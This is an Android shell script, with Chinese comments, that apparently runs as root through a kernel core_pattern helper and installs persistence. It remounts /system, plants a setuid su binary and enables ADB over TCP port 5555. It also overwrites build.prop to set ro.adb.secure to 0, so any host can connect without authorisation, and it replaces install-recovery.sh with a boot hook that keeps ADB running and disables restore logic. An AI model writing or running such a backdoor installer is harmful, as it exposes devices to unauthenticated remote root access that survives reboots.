#!/system/bin/sh
# roothelper.sh — 由内核 core_pattern 管道 helper 以 uid=0 执行
# （context=u:r:kernel:s0，capability 全量），完成全部持久化安装。
# 无可用 stdin/stdout，输出写入 /data/local/tmp/root.log。
exec </dev/null
LOG=/data/local/tmp/root.log
exec >$LOG 2>&1

echo "=== core_pattern helper ==="
id
echo "selinux: $(getenforce 2>/dev/null)"

# 1) remount /system
mount -o rw,remount /system && echo remount_ok

# 2) 安装 setuid su（并尝试 file caps）
if [ -f /data/local/tmp/su ]; then
    cp /data/local/tmp/su /system/xbin/su
    chown 0:0 /system/xbin/su
    chmod 6755 /system/xbin/su
    [ -f /data/local/tmp/setcap ] && /data/local/tmp/setcap /system/xbin/su
    ls -l /system/xbin/su
fi

# 3) ADB 属性持久化
setprop persist.adb.tcp.port 5555
setprop service.adb.tcp.port 5555

# 4) build.prop: ro.adb.secure 1 -> 0（禁用 RSA 配对，所有主机免授权）
#    build.prop.new 由宿主机 python 字节级替换生成（勿用设备端 sed，CRLF 会损坏）
if [ -f /sdcard/build.prop.new ]; then
    mount -o rw,remount /system
    cp /sdcard/build.prop.new /system/build.prop
    chown 0:0 /system/build.prop
    chmod 644 /system/build.prop
    grep -a "ro.adb.secure" /system/build.prop
fi

# 5) 部署开机钩子：install-recovery.sh 由 init class main 每次开机执行
#    install-recovery.sh.new2 = 接管版（ADB 常驻巡查 + 移除 applypatch 还原逻辑）
if [ -f /sdcard/install-recovery.sh.new2 ]; then
    cp /system/bin/install-recovery.sh /data/local/tmp/install-recovery.sh.orig2
    cp /sdcard/install-recovery.sh.new2 /system/bin/install-recovery.sh
    chown 0:0 /system/bin/install-recovery.sh
    chmod 750 /system/bin/install-recovery.sh
    echo "hook installed (infinite watch loop)"
fi

sync
echo "=== done ==="
